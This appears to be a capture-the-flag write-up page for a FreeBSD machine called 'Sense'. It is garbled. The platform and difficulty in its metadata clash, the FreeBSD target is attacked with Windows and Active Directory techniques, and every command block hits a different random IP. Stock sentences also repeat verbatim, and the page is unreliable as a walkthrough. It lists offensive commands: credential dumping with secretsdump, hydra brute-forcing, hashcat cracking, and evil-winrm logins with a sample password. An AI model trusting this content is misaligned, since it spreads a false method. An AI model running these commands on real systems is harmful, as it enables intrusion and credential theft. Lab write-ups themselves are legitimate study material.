---
TitleSEO: "PwnTillDawn — Sense (Easy FreeBSD) | ZureFX"
TitlePost: "PwnTillDawn — Sense (Easy FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for PwnTillDawn Sense. DNS Rebinding and Resource-Based Constrained Delegation to achieve easy compromise on FreeBSD."
Keywords: "tryhackme, forensics, web, hard"
URL: "https://zurefx.github.io/writeups/htb-sense-294.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-sense-294/"
Date: "2024-11-24"
Tags: "TryHackMe, Forensics, Web, Hard"
Section: "writeups"
Lang: "en"
main_img: "htb-sense-294"
Permalink: "/writeups/htb-sense-294.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Sense** is rated **Easy** on PwnTillDawn. It runs **FreeBSD** and the IP address during this analysis was `10.101.185.46`.

### Objectives

Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.142.194
gobuster dir -u http://10.58.241.73/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.120.59.115 -u administrator -p 'P@ssw0rd!' --shares
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Lateral movement was facilitated by reusing discovered credentials across services.

### Service Enumeration

The application stored sensitive credentials in an unencrypted configuration file. Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.247.226/FUZZ
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.104.227.131/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. Privilege escalation was possible due to misconfigured sudo permissions.

### Web Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.113.165.9
gobuster dir -u http://10.78.243.152/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The kernel version was outdated and vulnerable to a publicly known exploit. Post-exploitation enumeration revealed a path to domain administrator privileges. Network traffic analysis revealed unencrypted communications containing user credentials.

## Exploitation

### Vulnerability Identification

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code. Network traffic analysis revealed unencrypted communications containing user credentials.

Key finding: **DNS Rebinding**.

The application stored sensitive credentials in an unencrypted configuration file. The service account had excessive permissions assigned in Active Directory.

### Initial Access

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.64.111.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
evil-winrm -i 10.78.240.74 -u administrator -p 'P@ssw0rd!'
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality.

## Privilege Escalation

### Enumeration

The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```powershell
evil-winrm -i 10.98.242.60 -u administrator -p 'P@ssw0rd!'
feroxbuster -h
```

### Exploitation

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```powershell
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.129.42.126
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The scheduled task ran with elevated privileges and could be abused for escalation. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `netcat`
- `GetUserSPNs`
- `smbclient`
- `rubeus`
- `john`
- `ffuf`
- `feroxbuster`

### Key Takeaways

- DNS Rebinding
- Resource-Based Constrained Delegation
